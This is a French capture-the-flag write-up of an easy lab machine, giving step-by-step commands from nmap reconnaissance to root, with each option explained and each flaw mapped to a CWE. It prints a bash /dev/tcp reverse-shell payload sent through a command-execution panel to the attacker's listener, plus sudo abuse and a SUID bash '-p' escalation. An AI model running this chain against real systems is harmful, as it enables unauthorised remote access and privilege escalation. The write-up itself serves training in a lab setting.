# Write-up : "H4ck3rz #2"

**Cible :** 10.10.0.30 (même machine que "H4ck3rz", l'IP change à chaque redéploiement)

**Objectif :** Obtenir root.txt

**Difficulté :** Easy

**Date :** 22/09/2026

**Techniques utilisées :** Reconnaissance web, identifiants exposés (commentaire HTML + robots.txt), reverse shell, abus de `sudo` (NOPASSWD), escalade via un **bash SUID** lancé avec `-p`

**Outils utilisés :** nmap, curl, netcat (nc), python3, sudo

---

## 1. Reconnaissance réseau

```bash
nmap -sV -p- 10.10.0.30
```
**Options :**
- `-sV` = *Service/Version* : interroge chaque service pour deviner le **logiciel et sa version** (ex. OpenSSH, Apache 2.4.68).
- `-p-` = **tous les ports** (1 à 65535). Sans lui, nmap ne teste que les 1000 courants → on raterait un port planqué.
- `10.10.0.30` = la cible.

**Pourquoi :** trouver les services exposés.
**Résultat :** `22/tcp` SSH, `80/tcp` HTTP (Apache) → on attaque le web.

---

## 2. Trouver les identifiants du site

```bash
curl -s http://10.10.0.30/
```
**Options :**
- `-s` = *silent* : cache la barre de progression de curl, on ne voit que le contenu.

**Pourquoi :** lire le code source. → commentaire caché : **username `d4rk_T1t0u4N`**.

```bash
curl -s http://10.10.0.30/robots.txt
```
**Options :** `-s` = silent (idem).
**Pourquoi :** `robots.txt` est un fichier standard à toujours vérifier — il révèle des chemins cachés. → `Disallow: /1337_53CR37_l41r`.

```bash
curl -s http://10.10.0.30/1337_53CR37_l41r/
```
**Pourquoi :** visiter le chemin caché. → **mot de passe `8ES7_SHeLL_Ev4H`**.

**Faille exploitée :** exposition d'informations sensibles (CWE-200) + robots.txt utilisé comme "sécurité" (CWE-548).

---

## 3. Obtenir un shell (reverse shell)

Le "Shell Panel" (`portal.php`) exécute des commandes, mais il est **filtré** et **sans vrai terminal**. On demande donc à la cible de **nous rappeler** avec un vrai shell.

**Onglet 1 — on écoute :**
```bash
nc -lvnp 4444
```
**Options :**
- `-l` = *listen* : écouter (attendre une connexion) au lieu de se connecter.
- `-v` = *verbose* : affiche les messages (« Connection from … »).
- `-n` = *numeric* : pas de résolution DNS (plus rapide).
- `-p 4444` = le **port** d'écoute.

**Pourquoi :** ouvrir une "oreille" qui attend la connexion de la cible.

**Onglet 2 — se logger :**
```bash
curl http://10.10.0.30/login.php -c c -d 'username=d4rk_T1t0u4N&password=8ES7_SHeLL_Ev4H&sub=Login'
```
**Options :**
- `-c c` = *cookie jar* : **sauvegarde le cookie** de session reçu dans un fichier `c`.
- `-d '...'` = *data* : envoie les données en **POST** (le formulaire de login). `-d` bascule curl en POST automatiquement.

**Onglet 2 — déclencher le reverse shell :**
```bash
curl http://10.10.0.30/portal.php -b c --data-urlencode 'command=bash -c "bash -i >& /dev/tcp/10.8.0.255/4444 0>&1"' --data-urlencode sub=Execute
```
**Options :**
- `-b c` = *cookie* : **réutilise** le cookie sauvé (sinon non connecté).
- `--data-urlencode '...'` = envoie en POST **en encodant les caractères spéciaux** (espaces, `>`, `/`, `&`). Indispensable ici car la commande en contient.
- `command=bash -c "bash -i >& /dev/tcp/10.8.0.255/4444 0>&1"` = la **formule du reverse shell** : ouvre un bash interactif (`-i`) et **redirige** son entrée/sortie vers notre oreille via `/dev/tcp/NOTRE_IP/PORT`. `10.8.0.255` = notre IP Exegol (`tun0`).

→ Sur l'Onglet 1, un shell **`www-data@h4xx0r_pc`** apparaît.

**Faille exploitée :** exécution de commandes distante via le panel (CWE-78).

---

## 4. Escalade de privilèges → root

**Avoir un vrai terminal (sinon sudo refuse) :**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
**Options :**
- `-c '...'` = exécute directement le code Python entre guillemets (pas de fichier).
- `pty.spawn("/bin/bash")` = lance bash dans un **pseudo-terminal** → donne un vrai TTY (nécessaire pour `sudo`).

**Voir ses droits sudo :**
```bash
sudo -l
```
**Options :** `-l` = *list* : affiche ce qu'on a le droit de lancer avec sudo.
**Résultat :** `(titouan) NOPASSWD: ALL` → tout est permis en tant que **titouan**, sans mot de passe.
**Faille :** règle sudo trop permissive (CWE-269).

**Repérer le vecteur root :**
```bash
sudo -u titouan ls -la /home/titouan
```
**Options :**
- `-u titouan` = *user* : exécute la commande **en tant que titouan** (pas root par défaut).
- `ls -l` = format **long** (permissions, propriétaire, taille, date).
- `ls -a` = *all* : affiche aussi les **fichiers cachés** (commençant par `.`).

**Résultat :** `-rwsrwsrwt 1 root root ... 42sh` → un **bash SUID root** (le `s`) dans le home de titouan.
**Faille :** binaire SUID root exploitable (CWE-732).

**Devenir root :**
```bash
sudo -u titouan /home/titouan/42sh -p
```
**Options :**
- `-u titouan` = pour accéder au fichier (dossier privé de titouan, 700).
- `42sh` = bash renommé, **SUID root**.
- `-p` = option de **bash** (*privileged*) : **garde l'euid root**. Sans `-p`, bash abandonne les droits root.

→ le prompt passe à **`#`**, `id` montre **`euid=0(root)`**.
**Faille :** bash SUID + `-p` = root (GTFOBins, CWE-250).

---

## 5. Lire le flag

```bash
cat /root/root.txt
```
**Options :** aucune — `cat` affiche le contenu du fichier (on a maintenant les droits root pour le lire).

**FLAG obtenu :**

```
EPI{K0l0r5_4nD_f4nCY_pR0Mp7_4r3_R34lLY_n3C3554Ry}
```

---

## petit mémo des paramètre

| Outil | Option | Sens |
|-------|--------|------|
| nmap | `-sV` | version des services |
| nmap | `-p-` | tous les ports (1-65535) |
| nmap | `-F` | scan rapide (~100 ports) |
| nmap | `-Pn` | ne pas ping avant de scanner |
| curl | `-s` | silencieux (sortie propre) |
| curl | `-c fichier` | sauver les cookies |
| curl | `-b fichier` | envoyer les cookies |
| curl | `-d` | données POST (formulaire) |
| curl | `--data-urlencode` | données POST + encodage des caractères spéciaux |
| curl | `-i` | afficher les en-têtes HTTP |
| curl | `-L` | suivre les redirections |
| nc | `-l` | écouter |
| nc | `-v` | verbeux |
| nc | `-n` | pas de DNS |
| nc | `-p` | port |
| sudo | `-l` | lister ses droits |
| sudo | `-u user` | exécuter en tant que `user` |
| bash | `-p` | garder les privilèges (euid) |
| ls | `-l` / `-a` | format long / fichiers cachés |

> Pour tout connaître d'une commande : `man <commande>` ou `<commande> --help`.

---

## Résumé des failles exploitées

| # | Faille | CWE |
|---|--------|-----|
| 1 | Username dans un commentaire HTML | CWE-200 |
| 2 | Mot de passe révélé via robots.txt | CWE-548 |
| 3 | RCE via le Shell Panel (reverse shell) | CWE-78 |
| 4 | sudo `(titouan) NOPASSWD: ALL` | CWE-269 |
| 5 | Bash SUID root (`42sh`) + `-p` | CWE-732 / CWE-250 |

---

## Chaîne d'exploitation

```
nmap → 80 web
   │
commentaire HTML → username d4rk_T1t0u4N
robots.txt → /1337_53CR37_l41r → mot de passe
   │
Shell Panel → reverse shell (nc écoute + cible rappelle) → www-data
   │
python pty → sudo -l → (titouan) NOPASSWD: ALL
   │
sudo -u titouan /home/titouan/42sh -p   (-p garde root)
   │
cat /root/root.txt → FLAG
```

---

## Conclusion

- **Accès initial :** énumération web (commentaire + robots.txt) → reverse shell → `www-data`.
- **Pivot :** `sudo -u titouan` (NOPASSWD ALL).
- **Escalade root :** bash SUID `42sh` lancé avec **`-p`**.
- **Flag root :** `EPI{K0l0r5_4nD_f4nCY_pR0Mp7_4r3_R34lLY_n3C3554Ry}`

> Leçon clé : un **bash SUID** = root immédiat avec **`-p`**. Et un `curl` "vide" ou une box qui "ne répond plus" = souvent un **changement d'IP** → revérifie ta cible.
